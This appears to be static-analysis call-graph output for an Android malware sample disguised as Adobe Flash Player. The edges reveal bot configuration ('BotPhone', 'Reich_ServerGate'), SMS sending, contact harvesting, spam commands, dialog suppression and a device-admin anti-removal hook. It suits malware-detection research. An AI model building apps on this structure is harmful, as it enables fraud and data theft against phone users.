STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r1.<android.content.Intent: void <init>(java.lang.String)>("android.intent.action.CLOSE_SYSTEM_DIALOGS") in <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.SystemSWF: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("EST:") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashARM: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onWindowFocusChanged(boolean)>($z0) in <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)> ==> <android.app.Activity: void onWindowFocusChanged(boolean)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("forceZ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.AdobeZCore: void onDestroy()> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: specialinvoke $r7.<com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>(r0) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Title: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r28 = virtualinvoke $r26.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r27) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("forceZ", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("out", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r3.<android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/ADOBEcoreZa;") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(" ", "_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Visits: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r8 = interfaceinvoke r5.<java.util.Map: java.lang.Object get(java.lang.Object)>($r44) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l4 = virtualinvoke r3.<java.io.File: long length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: long length()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("wifiOn") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean contains(java.lang.CharSequence)>("B") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)>(0) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onWindowFocusChanged(boolean)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r2 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean contains(java.lang.CharSequence)>("ON") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_ServerGate", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r10 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r9) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=processes&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.MacrosStat: void <init>()> ==> <android.app.Service: void <init>()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)>
STATIC edge: $r11 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getContacts") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("Reich_ServerGate", r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, r19, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("c", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r10) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "pcss.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(268435456) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.app.Service: void onCreate()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onDestroy()>() in <com.adobe.flashplayer_.FlashARM: void onDestroy()> ==> <android.app.Activity: void onDestroy()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", r25, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=macros_a_good&i=macros_a_data") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("spam_data", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
